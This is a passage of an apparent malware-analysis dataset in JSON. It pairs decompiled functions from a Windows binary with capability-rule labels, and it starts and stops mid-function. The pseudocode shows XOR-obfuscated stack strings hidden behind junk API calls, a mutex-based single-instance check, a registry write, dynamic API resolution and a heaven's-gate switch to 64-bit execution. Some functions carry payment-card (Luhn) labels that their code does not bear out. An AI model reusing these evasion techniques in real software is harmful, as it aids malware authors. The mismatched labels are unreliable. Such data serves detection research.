(*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_34h = &var_14h - iVar6;\n    var_70h = iVar6;\n    do {\n        iVar8 = (*pcVar2)();\n        if (iVar8 != 0x408f9e) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_68h) ^ (iVar7 + iVar6)[var_34h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xb);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    if (iVar6 != 0) {\n        fcn.00404b41();\n    }\n    var_60h = 0x352e0019;\n    var_5ch = 0xa181820;\n    var_58h = 0x3a1e2c34;\n    var_54h = 0xe1b2038;\n    var_50h = 0x18162d11;\n    var_4ch._0_1_ = 1;\n    var_4ch._1_1_ = 0xf;\n    var_4ch._2_1_ = 0x13;\n    var_4ch._3_1_ = 0x36;\n    var_48h = 0x3d;\n    var_47h = 0x3c;\n    var_46h = 0x34;\n    var_45h = 0x22;\n    var_44h = 2;\n    var_43h = 0x2b;\n    var_42h._0_2_ = 0x2a38;\n    var_42h._2_1_ = 6;\n    var_42h._3_1_ = 0x15;\n    var_3eh = 0x3c21;\n    var_3ch = 0x38;\n    var_3bh = 0x3c;\n    var_3ah._0_1_ = 1;\n    var_3ah._1_1_ = 0xe;\n    var_3ah._2_1_ = 0x19;\n    var_3ah._3_1_ = 0x59;\n    var_90h = 0x61684f4a;\n    var_8ch._0_2_ = 0x5977;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_34h = &var_60h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        puVar9 = extraout_ECX_01;\n        if (iVar8 != 0x1e7b8f) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_90h + iVar7 % var_30h) ^ puVar9[&var_60h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x2a);\n    cVar3 = fcn.00404953(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404b41();\n    }\n    var_20h = 0x784b407e;\n    var_1ch = 0x417d490d;\n    var_18h = 0x520b6249;\n    var_14h = 0x7949467c;\n    var_10h._0_1_ = 0xd;\n    var_10h._1_1_ = 0x49;\n    var_10h._2_2_ = 0x4679;\n    var_ch._0_1_ = 0x40;\n    var_ch._1_1_ = 0x7a;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 100;\n    var_68h = 0x4f79754b;\n    var_64h._0_2_ = 0x6439;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_90h = iVar6;\n    var_34h = &var_20h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar8 != 0x23d223) {\n            *(iVar7 + iVar6) = *(&var_68h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_20h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.00404b41();\n    }\n    var_44h = 6;\n    var_50h = 0x60607f06;\n    var_4ch._0_1_ = 0x7b;\n    var_4ch._1_1_ = 0x6b;\n    var_4ch._2_1_ = 7;\n    var_4ch._3_1_ = 0x7d;\n    var_48h = 0x60;\n    var_47h = 0x75;\n    var_46h = 0x7f;\n    var_45h = 0x77;\n    var_43h = 0x7e;\n    var_42h._0_2_ = 0x6b64;\n    var_42h._2_1_ = 0x7b;\n    var_42h._3_1_ = 0x6b;\n    var_3eh = 0x7a03;\n    var_3ch = 0x61;\n    var_3bh = 0x69;\n    var_3ah._0_1_ = 0x7c;\n    var_3ah._1_1_ = 0x46;\n    var_10h._0_1_ = 0x31;\n    var_10h._1_1_ = 0x49;\n    var_10h._2_2_ = 0x5854;\n    var_ch._0_1_ = 0x4c;\n    var_ch._1_1_ = 0x46;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_68h = iVar6;\n    var_34h = &var_50h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0x41b13b) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_50h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.00404b41();\n    }\n    var_50h = 0x687f7772;\n    var_4ch._0_1_ = 0x7a;\n    var_4ch._1_1_ = 0x42;\n    var_4ch._2_1_ = 0x76;\n    var_4ch._3_1_ = 0x72;\n    var_48h = 0x7c;\n    var_47h = 0x7d;\n    var_46h = 0x75;\n    var_45h = 0x5b;\n    var_44h = 0x77;\n    var_43h = 0x78;\n    var_42h._0_2_ = 0x6572;\n    var_42h._2_1_ = 0x78;\n    var_42h._3_1_ = 0x42;\n    var_3eh = 0x7377;\n    var_3ch = 0x7d;\n    var_3bh = 0x61;\n    var_3ah._0_1_ = 0x79;\n    var_3ah._1_1_ = 0x6f;\n    var_10h._0_1_ = 0x45;\n    var_10h._1_1_ = 0x41;\n    var_10h._2_2_ = 0x504b;\n    var_ch._0_1_ = 0x4d;\n    var_ch._1_1_ = 0x6f;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_34h = &var_50h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar8 != 0xa4cd07) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_50h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar6);\n    iVar7 = var_68h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.00404b41();\n    }\n    uVar5 = (*pcVar2)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_28h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_2ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar10 = (*pcVar1)(uVar5);\n    return uVar10 & 0xffffff00;\n}\n",
        "token_count": 9573
    },
    "0040b474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b474(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41dd74 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "0040d065": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040d065(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_4h;\n    \n    var_24h = 0x3134290b;\n    var_20h = 0x707e0331;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x50);\n    var_18h = 0x50424d6a;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x41);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_ch = 5;\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar3 != 0xe6e1bd) {\n            *(iVar6 + iVar2) = *(&var_18h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41ddd4 == NULL) {\n        var_2ch = 0x24250964;\n        var_28h._0_2_ = 0x5950;\n        var_28h._2_1_ = 0x71;\n        var_28h._3_1_ = 5;\n        var_24h = 0x5d413338;\n        var_20h = 0x63661e58;\n        var_1ch._0_2_ = 0x3403;\n        var_18h = 0x50567037;\n        var_14h._0_2_ = 0x3435;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_ch = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0x13467c) {\n                var_ch = 6;\n                *(iVar3 + iVar6) = *(&var_18h + iVar3 % 6) ^ (iVar3 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41ddd4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41ddd4)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 923
    },
    "0040c9e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040c9e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040c89d(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040be46(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00405f18(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 581
    },
    "00410460": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00410460(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.004104b5(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 184
    },
    "0040185a": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040185a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_10h = *0x41da50;\n    var_44h = 0x6c5d501e;\n    var_40h = 0x32244d3e;\n    var_3ch = 0x502c581b;\n    var_38h = 0x4d3d6c40;\n    var_34h = 0x5821320c;\n    var_30h = 0x6c515024;\n    var_2ch = 0x323f4d2a;\n    var_28h = 0x5022581f;\n    var_24h = 0x4d2c6c54;\n    var_20h._0_2_ = 0x3250;\n    var_1ch = 0x6c32504d;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x58);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_14h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar3 != 0x11c936) {\n            var_8h = 5;\n            *(iVar5 + iVar2) = *(&var_1ch + iVar5 % 5) ^ (iVar5 + iVar2)[&var_44h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        var_3ch = 0x6d444416;\n        var_38h = 0x44396c39;\n        var_34h = 0x6c246d7c;\n        var_30h = 0x6d7d4432;\n        var_2ch = 0x442d6c2a;\n        var_28h = 0x6c226d63;\n        var_24h = 0x6d55442f;\n        var_20h._0_2_ = 0x6c4b;\n        var_1ch = 0x6d304455;\n        var_18h._0_2_ = 0x6c4b;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_3ch - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n            if (iVar3 != 0xe6d7b1) {\n                hKey = 6;\n                *(iVar5 + iVar2) = *(&var_1ch + iVar5 % 6) ^ (iVar5 + iVar2)[&var_3ch - iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_10h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_14h;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1113
    },
    "00403c0e": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "create mutex",
            "check mutex and exit",
            "terminate process"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403c0e(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x4e146e61;\n    var_38h = 0x6e444d07;\n    var_34h = 0x4d164e18;\n    var_30h = 0x4e346e57;\n    var_2ch = 0x6e464d1b;\n    var_28h = 0x4d0c4e03;\n    var_24h = 0x4e1e6e62;\n    var_20h = 0x6e5c4d1c;\n    var_1ch = 0x4d214e05;\n    var_18h = 0x4e036e5a;\n    var_14h = 0x6e534d10;\n    var_10h = 0x4d754e15;\n    var_ch = 0x4e716e32;\n    var_8h._0_2_ = 0x4d75;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x5206a2) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_ch + iVar5 % 6) ^ (iVar5 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n        uVar2 = (*pcVar1)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 683
    },
    "0040610f": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "get disk information",
            "accept command line arguments"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040610f(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar var_8h;\n    uint var_7h;\n    uint var_3h;\n    \n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 0x11;\n    var_18h._2_1_ = 0x16;\n    var_18h._3_1_ = 0x37;\n    var_14h._0_1_ = 0x33;\n    var_14h._1_1_ = 0x25;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x11;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x2a;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x21;\n    var_38h = 6;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x2c;\n    var_8h = 0x20;\n    var_7h._0_1_ = 0x2d;\n    var_7h._1_1_ = 4;\n    var_7h._2_1_ = 0x11;\n    var_7h._3_1_ = 0x32;\n    var_3h._0_1_ = 0x20;\n    var_3h._1_1_ = 0x56;\n    var_28h = 0x45557468;\n    var_24h._0_2_ = 0x4456;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar24 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar5 != 0xb3042d) {\n            *(iVar24 + iVar4) = *(&var_28h + iVar24 % var_38h) ^ (iVar24 + iVar4)[&var_18h - iVar4];\n        }\n        iVar24 = iVar24 + 1;\n    } while (iVar24 < 0x17);\n    fcn.0040f262();\n    var_20h = 0x2b251503;\n    var_1ch = 0xa17393c;\n    var_18h._0_1_ = 8;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x1d;\n    var_34h = 5;\n    var_14h._0_1_ = 5;\n    var_14h._1_1_ = 0x2a;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 4;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0xd;\n    var_ch._3_1_ = 0x2e;\n    var_8h = 0x26;\n    var_7h._0_1_ = 0x3c;\n    var_7h._1_1_ = 0x15;\n    var_7h._2_1_ = 3;\n    var_7h._3_1_ = 0x3d;\n    var_3h._0_1_ = 0x4f;\n    var_a8h = 0x58647050;\n    var_a4h._0_1_ = 0x4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_2ch = &var_20h - iVar24;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar6 != 0x57de09) {\n            *(iVar5 + iVar24) = *(&var_a8h + iVar5 % var_34h) ^ (iVar5 + iVar24)[&var_20h - iVar24];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x1b;\n    var_18h._1_1_ = 0x2b;\n    var_18h._2_1_ = 0x3a;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x13;\n    var_14h._2_1_ = 5;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x1b;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x39;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x18;\n    var_ch._1_1_ = 0x3c;\n    var_ch._2_1_ = 0x1f;\n    var_ch._3_1_ = 0x15;\n    var_8h = 0x22;\n    var_7h._0_1_ = 0x14;\n    var_7h._1_1_ = 0x2d;\n    var_7h._2_1_ = 0x29;\n    var_7h._3_1_ = 0x13;\n    var_3h._0_1_ = 99;\n    var_28h = 0x63764e48;\n    var_24h._0_2_ = 0x784b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_a8h = iVar5;\n    var_2ch = &var_18h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar7 != 0xdab59b) {\n            *(iVar6 + iVar5) = *(&var_28h + iVar6 % var_38h) ^ (iVar6 + iVar5)[&var_18h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x16);\n    fcn.0040f262();\n    var_1ch = 0x39241711;\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 0x30;\n    var_18h._2_1_ = 0x17;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x13;\n    var_14h._3_1_ = 7;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0x23;\n    var_10h._2_1_ = 0x37;\n    var_10h._3_1_ = 0x12;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x3f;\n    var_8h = 0x2e;\n    var_7h._0_1_ = 0x17;\n    var_7h._1_1_ = 10;\n    var_7h._2_1_ = 0x32;\n    